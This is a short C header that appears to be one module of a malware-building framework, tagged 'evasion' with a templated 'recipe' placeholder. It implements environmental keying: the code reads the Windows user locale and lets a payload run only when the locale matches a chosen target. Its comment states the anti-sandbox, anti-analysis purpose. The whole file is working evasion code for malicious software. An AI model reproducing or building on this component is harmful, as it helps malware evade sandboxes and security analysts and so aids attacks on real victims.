// chunk: evasion/env_key_locale
// depends: (none)
// provides: env_check_locale
// headers: windows.h
// risk: low
// note: Environmental keying — only execute if system locale matches.
//       Set ENV_KEY_LOCALE var in recipe (e.g., "en-US", "ja-JP", "de-DE").
//       Common anti-analysis: many sandboxes use en-US with UTC timezone.

#ifndef CHUNK_ENV_KEY_LOCALE
#define CHUNK_ENV_KEY_LOCALE

#include <windows.h>

#ifndef ENV_KEY_LOCALE
#define ENV_KEY_LOCALE "{{ENV_KEY_LOCALE}}"
#endif

static int env_check_locale(void) {
    const char *target = ENV_KEY_LOCALE;
    if (target[0] == '\0')
        return 1;

    char locale[LOCALE_NAME_MAX_LENGTH] = {0};
    WCHAR wlocale[LOCALE_NAME_MAX_LENGTH] = {0};
    int len = GetUserDefaultLocaleName(wlocale, LOCALE_NAME_MAX_LENGTH);
    if (len <= 0) return 0;
    WideCharToMultiByte(CP_ACP, 0, wlocale, -1, locale, sizeof(locale), NULL, NULL);

    for (int i = 0; locale[i]; i++)
        if (locale[i] >= 'A' && locale[i] <= 'Z')
            locale[i] += 32;
    char lower_target[32] = {0};
    int j = 0;
    for (; target[j] && j < 31; j++)
        lower_target[j] = (target[j] >= 'A' && target[j] <= 'Z') ? target[j] + 32 : target[j];
    if (strstr(locale, lower_target))
        return 1;
    return 0;
}

#endif
